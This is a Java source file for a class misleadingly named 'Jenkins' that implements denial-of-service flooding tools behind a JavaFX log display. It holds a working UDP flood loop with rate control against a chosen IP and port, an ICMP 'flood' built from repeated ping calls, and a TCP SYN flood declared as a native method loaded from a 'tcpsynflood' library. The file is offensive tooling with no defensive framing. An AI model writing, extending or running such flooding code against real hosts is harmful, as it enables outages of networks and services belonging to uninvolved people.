package com.yourpackage;

import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.util.logging.Logger;
import java.net.Socket;
import java.io.OutputStream;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Random;
import java.io.File;

public class Jenkins {
    private static final byte[] DEFAULT_PAYLOAD = new byte[1300]; // 1300 bytes payload
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private TextArea logArea;

    // Constructor
    public Jenkins() {
        // Initialize any required resources
    }

    // Method to set the log area
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // UDP Flood method
    public void udpFlood(String targetIp, int targetPort, int bytesPerSecond) {
        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");

        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[1300]; // Adjust packet size if needed
            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);

            long startTime = System.currentTimeMillis();
            long bytesSent = 0;
            int packetsSent = 0;

            while (!stopAttack) {
                socket.send(packet);
                bytesSent += buffer.length;
                packetsSent++;

                if (packetsSent % 1000 == 0) { // Log every 1000 packets
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                }

                // Add rate limiting if necessary
                if (bytesSent >= bytesPerSecond) {
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    if (elapsedTime < 1000) {
                        Thread.sleep(1000 - elapsedTime);
                    }
                    startTime = System.currentTimeMillis();
                    bytesSent = 0;
                }
            }
        } catch (Exception e) {
            log("Error in UDP flood: " + e.getMessage());
        }
        log("UDP flood attack stopped");
    }

    // TCP SYN Flood method
    public native void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);

    static {
        try {
            System.loadLibrary("tcpsynflood");
        } catch (UnsatisfiedLinkError e) {
            System.err.println("Native code library failed to load. \n" + e);
            System.err.println("java.library.path: " + System.getProperty("java.library.path"));
            System.exit(1);
        }
    }

    // ICMP Flood method
    public void icmpFlood(String targetIp, int bytesPerSecond) {
        logger.info("Starting ICMP flood attack on " + targetIp + " at " + bytesPerSecond + " bytes/second");

        try {
            long startTime = System.currentTimeMillis();
            int bytesSent = 0;

            while (!stopAttack) {
                long currentTime = System.currentTimeMillis();
                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
                    Process process = new ProcessBuilder("ping", "-n", "1", targetIp).start();
                    process.waitFor();
                    bytesSent += 64; // Approximate size of an ICMP packet
                } else {
                    Thread.sleep(1);
                }
            }
        } catch (Exception e) {
            logger.severe("Error during ICMP flood: " + e.getMessage());
        } finally {
            logger.info("ICMP flood attack stopped on " + targetIp);
            stopAttack = false;
        }
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
    }

    // Method to reset the attack
    public void resetAttack() {
        stopAttack = false;
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
            });
        }
    }
}
